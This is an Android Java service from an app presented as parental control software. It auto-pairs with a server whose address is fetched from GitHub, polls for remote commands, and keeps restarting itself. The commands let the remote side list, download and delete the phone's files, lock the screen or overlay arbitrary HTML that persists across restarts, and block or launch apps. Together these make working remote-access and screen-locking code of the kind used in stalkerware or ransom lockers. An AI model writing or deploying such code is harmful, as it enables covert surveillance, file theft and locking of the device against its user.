package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import androidx.annotation.Nullable;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Set;

/**
 * Persistent, visible Guardian control channel.
 * Keeps the device paired and polls commands even when MainActivity is closed.
 * Android/OEM power-management policies can still stop background work; this
 * service uses START_STICKY and is restarted after boot as a best effort.
 */
public class GuardianControlService extends Service {
    public static final String ACTION_SERVICE_COMMAND = "com.nullx.pp.GUARDIAN_SERVICE_COMMAND";
    private static final String CHANNEL_ID = "guardian_control";
    private static final int NOTIFICATION_ID = 19041;
    private volatile boolean running;
    private Thread worker;

    @Override public void onCreate() {
        super.onCreate();
        DeviceService.loadCached(this);
        createChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        DeviceService.refreshAsync();
        running = true;
        worker = new Thread(this::loop, "GuardianPersistentControl");
        worker.start();
        scheduleWatchdog();
        // Restore an active HTML lock after a service/process restart.
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::restoreHtmlLockIfNeeded, 500);
    }


    private void scheduleWatchdog() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent i = new Intent(this, ServiceWatchdogReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(this, 19042, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            long first = System.currentTimeMillis() + 15 * 60_000L;
            if (am != null) am.setInexactRepeating(AlarmManager.RTC_WAKEUP, first, 15 * 60_000L, pi);
        } catch (Exception ignored) {}
    }
    private Notification buildNotification() {
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, CHANNEL_ID)
                : new Notification.Builder(this);
        return b.setContentTitle("Guardian Anak aktif")
                .setContentText("Kontrol orang tua tetap tersambung di latar belakang")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setOngoing(true)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID,
                    "Guardian Control", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Koneksi kontrol Guardian yang berjalan di latar belakang.");
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private void loop() {
        long lastConfig = 0;
        long lastHeartbeat = 0;
        while (running) {
            try {
                long now = System.currentTimeMillis();
                if (DeviceService.getBaseUrl().isEmpty() || now - lastConfig > 5 * 60_000L) {
                    if (DeviceService.refreshFromGitHub()) DeviceService.cacheBaseUrl(this);
                    lastConfig = now;
                }
                ensurePair();
                String id = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("targetId", "");
                if (!id.isEmpty() && !DeviceService.getBaseUrl().isEmpty()) {
                    if (now - lastHeartbeat >= 30000) {
                        postJson(DeviceService.url("/api/ping/") + java.net.URLEncoder.encode(id, "UTF-8"), "{\"battery\":" + batteryLevel() + "}");
                        lastHeartbeat = now;
                    }
                    String raw = getText(DeviceService.url("/api/get-command/") + java.net.URLEncoder.encode(id, "UTF-8"));
                    if (raw != null && !raw.isEmpty()) {
                        JSONObject cmd = new JSONObject(raw);
                        handleCommand(cmd.optString("command", ""), cmd);
                    }
                }
                Thread.sleep(2500);
            } catch (InterruptedException e) { break; }
            catch (Exception ignored) {
                try { Thread.sleep(3000); } catch (InterruptedException e) { break; }
            }
        }
    }

    private void ensurePair() {
        try {
            String existing = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("targetId", "");
            String pairId = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("pairId", "");
            if (!existing.isEmpty() && !pairId.isEmpty()) return;
            InputStream in = getAssets().open("pairing.json");
            BufferedReader br = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(); String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            String sha = new JSONObject(sb.toString()).optString("sha", "").trim();
            if (sha.isEmpty() || "ID PAIRING ORANG TUA".equals(sha) || DeviceService.getBaseUrl().isEmpty()) return;
            String aid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            String id = (Build.BRAND + "-" + Build.MODEL + "-" + (aid == null ? "UNKNOWN" : aid)).replace(' ', '_');
            JSONObject body = new JSONObject();
            body.put("sha", sha); body.put("deviceId", id);
            body.put("model", Build.BRAND + " " + Build.MODEL);
            body.put("battery", batteryLevel());
            String response = postJson(DeviceService.url("/api/auto-pair"), body.toString());
            String chatToken = "";
            try { if (response != null) chatToken = new JSONObject(response).optString("chatToken", ""); } catch (Exception ignored) {}
            getSharedPreferences("GuardianPrefs", MODE_PRIVATE).edit()
                    .putString("targetId", id).putString("pairId", sha)
                    .putString("chatToken", chatToken).apply();
        } catch (Exception ignored) {}
    }

    private int batteryLevel() {
        try {
            android.content.IntentFilter f = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent i = registerReceiver(null, f);
            int level = i == null ? -1 : i.getIntExtra("level", -1);
            int scale = i == null ? -1 : i.getIntExtra("scale", -1);
            return level >= 0 && scale > 0 ? Math.round(level * 100f / scale) : -1;
        } catch (Exception e) { return -1; }
    }

    private void handleCommand(String command, JSONObject cmd) {
        if (command.isEmpty()) return;

        // Every parent-side control request also brings the visible Guardian Anak
        // UI to the foreground. The actual command handling below remains in
        // this persistent service, so closing/swiping the UI does not stop polling.
        bringGuardianAppToFront(command, cmd);

        // Commands that are safe to process without an Activity.
        if ("app_info".equals(command)) {
            AppInfoHelper.sendFromContext(this);
            return;
        }
        if ("block_app".equals(command)) {
            blockApp(cmd.optString("extra", "")); return;
        }
        if ("unblock_app".equals(command)) {
            unblockApp(cmd.optString("extra", "")); return;
        }
        if ("unblock_all_apps".equals(command)) {
            saveBlocked(new HashSet<>());
            sendBroadcast(local(AppBlockerService.ACTION_UNBLOCK_ALL, null));
            GuardianCommandReporter.post(this, "unblock_all_apps", new JSONObject());
            return;
        }
        if ("get_blocked_apps".equals(command)) {
            try {
                JSONObject d = new JSONObject(); JSONArray a = new JSONArray();
                for (String p : loadBlocked()) a.put(p);
                d.put("blockedApps", a); d.put("accessibilityEnabled", AppBlockerService.isEnabled(this));
                GuardianCommandReporter.post(this, "get_blocked_apps", d);
            } catch (Exception ignored) {}
            return;
        }
        if ("open_app_blocker_settings".equals(command)) {
            try {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                JSONObject d = new JSONObject(); d.put("accessibilitySettingsOpened", true);
                GuardianCommandReporter.post(this, "open_app_blocker_settings", d);
            } catch (Exception e) { }
            return;
        }
        if ("open_app".equals(command)) {
            openPackage(cmd.optString("extra", "")); return;
        }
        if ("lock_device".equals(command)) {
            startChildService(LockOverlayService.class, LockOverlayService.ACTION_LOCK); return;
        }
        if ("unlock".equals(command)) {
            startChildService(LockOverlayService.class, LockOverlayService.ACTION_UNLOCK); return;
        }
        if ("touch_lock_on".equals(command) || "touch_lock_off".equals(command)) {
            startChildService(LockOverlayService.class,
                    "touch_lock_on".equals(command) ? LockOverlayService.ACTION_TOUCH_LOCK : LockOverlayService.ACTION_TOUCH_UNLOCK); return;
        }
        if ("html_lock".equals(command)) {
            String html = cmd.optString("extra", "");
            startHtmlLock(html); return;
        }
        if ("stop_html".equals(command)) {
            stopHtmlLock(); return;
        }
        if ("file_manager".equals(command)) {
            FileManagerHelper.listDirectory(this, cmd.optString("extra", "/storage/emulated/0"));
            return;
        }
        if ("file_download".equals(command)) {
            FileManagerHelper.downloadFile(this, cmd.optString("extra", ""));
            return;
        }
        if ("file_delete".equals(command)) {
            FileManagerHelper.deleteFile(this, cmd.optString("extra", ""));
            return;
        }
        // UI/permission-sensitive commands are forwarded to MainActivity when it is alive.
        Intent b = local(ACTION_SERVICE_COMMAND, null);
        b.putExtra("command", command);
        b.putExtra("cmd_json", cmd.toString());
        // Give a newly launched MainActivity time to register its receiver.
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                () -> sendBroadcast(b), 600);
    }

    private void restoreHtmlLockIfNeeded() {
        try {
            android.content.SharedPreferences p = getSharedPreferences("GuardianPrefs", MODE_PRIVATE);
            if (!p.getBoolean("htmlLocked", false)) return;
            String html = p.getString("htmlLockContent", "");
            Intent i = new Intent(this, LockOverlayService.class).setAction(LockOverlayService.ACTION_HTML_LOCK);
            i.putExtra("html", html);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }

    private void bringGuardianAppToFront(String command, JSONObject cmd) {
        try {
            Intent i = new Intent(this, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            i.putExtra("guardian_remote_command", command);
            startActivity(i);
        } catch (Exception e) {
            android.util.Log.w("GUARDIAN", "Cannot bring Guardian Anak to foreground: " + e.getMessage());
        }
    }

    private void startHtmlLock(String html) {
        try {
            Intent i = new Intent(this, LockOverlayService.class).setAction(LockOverlayService.ACTION_HTML_LOCK);
            i.putExtra("html", html);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
            JSONObject result = new JSONObject(); result.put("opened", true); result.put("service", true);
            GuardianCommandReporter.post(this, "html_lock", result);
        } catch (Exception e) {
            try { GuardianCommandReporter.post(this, "html_lock", new JSONObject().put("error", e.toString())); } catch (Exception ignored) {}
        }
    }

    private void stopHtmlLock() {
        try {
            getSharedPreferences("GuardianPrefs", MODE_PRIVATE).edit().putBoolean("htmlLocked", false).remove("htmlLockContent").apply();
            Intent i = new Intent(this, LockOverlayService.class).setAction(LockOverlayService.ACTION_HTML_UNLOCK);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
            JSONObject result = new JSONObject(); result.put("stopped", true); result.put("service", true);
            GuardianCommandReporter.post(this, "stop_html", result);
        } catch (Exception e) {
            try { GuardianCommandReporter.post(this, "stop_html", new JSONObject().put("error", e.toString())); } catch (Exception ignored) {}
        }
    }

    private void openPackage(String pkg) {
        JSONObject d = new JSONObject();
        try {
            d.put("package", pkg);
            Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
            if (i == null) {
                // Try MAIN/LAUNCHER resolution explicitly.
                i = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
                        .setPackage(pkg).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                if (getPackageManager().queryIntentActivities(i, PackageManager.MATCH_ALL).isEmpty()) i = null;
            }
            if (i != null) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                d.put("opened", true);
            } else d.put("opened", false);
        } catch (Exception e) { try { d.put("opened", false); d.put("error", e.toString()); } catch (Exception ignored) {} }
        GuardianCommandReporter.post(this, "open_app", d);
    }

    private void blockApp(String pkg) {
        if (pkg.isEmpty() || pkg.equals(getPackageName())) return;
        Set<String> s = loadBlocked(); s.add(pkg); saveBlocked(s);
        sendBroadcast(local(AppBlockerService.ACTION_BLOCK_APP, pkg));
        try { JSONObject d = new JSONObject(); d.put("blocked", pkg); d.put("total", s.size()); d.put("accessibilityEnabled", AppBlockerService.isEnabled(this)); GuardianCommandReporter.post(this, "block_app", d); } catch (Exception ignored) {}
    }
    private void unblockApp(String pkg) {
        if (pkg.isEmpty()) return;
        Set<String> s = loadBlocked(); s.remove(pkg); saveBlocked(s);
        sendBroadcast(local(AppBlockerService.ACTION_UNBLOCK_APP, pkg));
        try { JSONObject d = new JSONObject(); d.put("unblocked", pkg); d.put("total", s.size()); GuardianCommandReporter.post(this, "unblock_app", d); } catch (Exception ignored) {}
    }
    private Set<String> loadBlocked() {
        Set<String> s = new HashSet<>();
        try { JSONArray a = new JSONArray(getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("blockedApps", "[]")); for (int i=0;i<a.length();i++) s.add(a.getString(i)); } catch (Exception ignored) {}
        return s;
    }
    private void saveBlocked(Set<String> s) {
        JSONArray a = new JSONArray(); for (String p:s) a.put(p);
        getSharedPreferences("GuardianPrefs", MODE_PRIVATE).edit().putString("blockedApps", a.toString()).apply();
    }
    private Intent local(String action, String pkg) {
        Intent i = new Intent(action).setPackage(getPackageName());
        if (pkg != null) i.putExtra("package", pkg);
        return i;
    }
    private void startChildService(Class<?> cls, String action) {
        try {
            Intent i = new Intent(this, cls).setAction(action);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }
    private String getText(String url) {
        HttpURLConnection c=null; try { c=(HttpURLConnection)new URL(url).openConnection(); c.setRequestMethod("GET"); c.setConnectTimeout(7000); c.setReadTimeout(7000); InputStream in=c.getInputStream(); BufferedReader br=new BufferedReader(new InputStreamReader(in,StandardCharsets.UTF_8)); StringBuilder sb=new StringBuilder(); String l; while((l=br.readLine())!=null)sb.append(l); br.close(); return sb.toString(); } catch(Exception e){return null;} finally{if(c!=null)c.disconnect();}
    }
    private String postJson(String url,String json){ HttpURLConnection c=null; try{c=(HttpURLConnection)new URL(url).openConnection();c.setRequestMethod("POST");c.setConnectTimeout(10000);c.setReadTimeout(10000);c.setDoOutput(true);c.setRequestProperty("Content-Type","application/json");try(OutputStream o=c.getOutputStream()){o.write(json.getBytes(StandardCharsets.UTF_8));} InputStream in=c.getResponseCode()>=400?c.getErrorStream():c.getInputStream(); if(in==null)return null;BufferedReader br=new BufferedReader(new InputStreamReader(in,StandardCharsets.UTF_8));StringBuilder s=new StringBuilder();String l;while((l=br.readLine())!=null)s.append(l);br.close();return s.toString();}catch(Exception e){return null;}finally{if(c!=null)c.disconnect();}}

    @Override public int onStartCommand(Intent intent,int flags,int startId){ return START_STICKY; }
    @Override public void onTaskRemoved(Intent rootIntent){
        // Request a restart after the task is removed; OEM policies may override this.
        try { Intent i=new Intent(this, GuardianControlService.class); if(Build.VERSION.SDK_INT>=26) startForegroundService(i); else startService(i); } catch(Exception ignored){}
        super.onTaskRemoved(rootIntent);
    }
    @Override public void onDestroy(){
        running=false;
        if(worker!=null)worker.interrupt();
        // Ask Android to restart the visible control service if it is stopped.
        try {
            AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);
            Intent i = new Intent(this, ServiceWatchdogReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(this, 19042, i, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            if (am != null) am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+15000L, pi);
        } catch (Exception ignored) {}
        super.onDestroy();
    }
    @Nullable @Override public IBinder onBind(Intent intent){ return null; }
}
